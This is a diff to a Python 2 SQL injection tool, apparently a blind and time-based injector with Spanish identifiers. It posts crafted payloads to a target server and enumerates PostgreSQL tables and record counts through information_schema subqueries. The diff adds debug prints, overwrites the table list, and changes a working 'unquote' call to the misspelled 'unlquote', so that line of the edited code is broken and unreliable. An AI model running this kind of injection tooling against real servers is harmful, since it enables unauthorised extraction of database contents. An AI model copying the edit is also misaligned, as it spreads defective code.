@@ -575,7 +575,7 @@ class Injection:
 				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
 				if self.verbosity:
-					self.showData(objeto=Attempt,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+					self.showData(objeto=Attempt,vulnerable=True,lll=unlquote(repr(Attempt.request.body)))
 				if self.Based == "time":
 					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time)) #(Attempt.elapsed.total_seconds())# + float(self.Time) )
 					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
@@ -618,6 +618,7 @@ class Injection:
 		tt = ""
 		if self.Which == "Postgres": # Postgres se porta bien reina ¬¬
 			tt += self.AuxiliarTablasPost()
+			print "<"*30,tt
 			self.RelacionBaseTabla["postgres"]=tt.split(',')
 			print "="*80
 			print "current_database() =>",self.RelacionBaseTabla["postgres"]
@@ -692,6 +693,8 @@ class Injection:
 		oset = 0
 		cc = 0
 		lta = []
+		print ">="*40,self.RelacionBaseTabla
+		self.RelacionBaseTabla["postgres"] = self.listaTablas
 		#Conociendo la cantidad de registros que tiene una tabla en postgres
 		for t in self.RelacionBaseTabla["postgres"]:
 			numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
@@ -882,6 +885,7 @@ class Injection:
 							longRecord = self.LongitudRegistro(tipo="registros",ofset=renglon,ppd=lengthMsg)
 							#### Aqui hacemos uso de otra funciona para que busque el caracter por medio de iteraciones de la posicion y el código Ascii
 							lleettrraass = self.getRecords(pppp=msg,offse=renglon,longitud=longRecord)
+							print ""
 							#print "\033[1;36m",lleettrraass,"\033[0m"
 							#print ""
 
